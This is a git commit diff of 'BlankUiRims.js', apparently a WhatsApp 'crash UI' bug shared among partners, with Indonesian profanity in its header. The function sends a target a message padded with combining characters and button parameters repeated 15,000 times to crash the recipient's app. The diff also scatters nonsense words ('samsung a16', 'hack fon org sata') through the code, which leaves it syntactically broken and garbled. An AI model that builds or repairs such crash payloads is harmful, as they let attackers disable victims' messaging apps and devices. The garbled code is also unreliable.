f99e838578843a61d3b1c8703f04103e78a4b373
taufiq461 <topektopek4674@gmail.com>
2025-10-05 16:00:34 +0800

    Update BlankUiRims.js

--- BlankUiRims.js
+++ BlankUiRims.js
@@ -3,7 +3,7 @@ Function Crashui Create By @GyzenVtx Khusus Patner
 Rules :
 • No Share Function Ke Own/Tk/PT Lu
 • No Sebar Function Secara Free
-Melanggar? Gw Bl + Kick Lu Bangsat 
+Melanggar? Gw Bl + Kick Lu Bangsat bodo lu anj
 */
 
 async function rimscrashui(target sama ios android pc tv) { android pc telefon 
@@ -17,13 +17,13 @@ mentionedJid: [target] ios android laptop tv pc
 isForwarded: true,
 forwardingScore: 999999999999 samsung a16,
 businessMessageForwardInfo: {
-businessOwnerJid: target,wasap biasa
+businessOwnerJid: target,wasap biasa panel kafa
 },
 },
 body: { text: "floare Rims🤬😈 npm start panel bot sc wasap telegram" + "⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟".repeat(15000), },
 nativeFlowMessage: { messageParamsJson: "{".repeathack fon org sata (15000),
 buttons: [
-{ name: "call_permission_request", ParamsJson: "{".repeat(15000), version: 5},
+{ name: "call_permission_request", javascJson: "{".repeat(15000), version: 5},
 { name: "cta_url", ParamsJson: "{".repeat(15000), version: 5 },
 { name: "cta_call", ParamsJson: "{".repeat(15000), version version aok hack: 5 },
 { name: "cta_copy", ParamsJson: "{".repeat(15000), version: 5 },
